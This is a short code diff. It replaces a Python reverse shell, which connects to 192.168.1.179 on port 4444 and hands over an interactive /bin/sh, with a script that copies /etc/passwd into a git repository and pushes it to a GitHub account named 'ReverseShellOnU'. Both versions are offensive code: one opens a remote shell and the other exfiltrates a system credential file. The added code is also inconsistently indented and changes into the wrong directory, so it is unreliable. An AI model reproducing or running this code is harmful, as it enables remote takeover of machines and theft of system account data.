@@ -1,10 +1,14 @@
-import socket
-import subprocess
-import os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.1.179",4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-subprocess.call(["/bin/sh","-i"])
+ import os 
+    os.system('git config --global user.email "alberttventura@gmail.com"')     
+    os.system('git config --global user.name "ReverseShellOnU"')
+    os.chdir("/home/kali")
+    os.system("git clone git@github.com:ReverseShellOnU/Token-github.git")
+    os.system("cp /etc/passwd /home/kali/Token-github")
+    os.chdir("/home/kali/passwd")
+    
+    os.system("git init")
+    os.system("git add .")
+    os.system('git commit -m "/etc/passwd de Albert"')
+    os.system("git remote add origin git@github.com:ReverseShellOnU/Token-github.git")
+    os.system("git push -u origin main")
     
